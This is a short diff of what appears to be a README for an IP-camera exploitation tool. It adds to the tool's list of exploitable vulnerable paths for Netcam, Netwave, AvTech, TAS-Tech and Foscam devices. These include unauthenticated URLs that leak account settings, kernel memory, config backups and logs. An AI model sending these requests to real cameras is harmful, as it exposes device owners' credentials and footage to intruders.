@@ -60,7 +60,21 @@ Today the tool detect
 Today the tool found and can exploit these vulnerabilites
 
 >
-	[Netcam] /anony/mjpg.cgi
-	[Netwave] //proc/kcore
+	[Netcam]   
+	- /anony/mjpg.cgi  
+	[Netwave]   
+	- //proc/kcore  
+	[AvTech]   
+	- cgi-bin/nobody/Machine.cgi?action=get_capability   
+	- cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*   
+	- cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.*   
+	[TAS-Tech]   
+	- user.html   
+	[Foscam]
+	- tmpfs/config_backup.bin
+	- tmpfs/config_restore.bin
+	- tmpfs/ddns.conf
+	- tmpfs/syslog.txt
+	- log/syslog.txt
 
 >
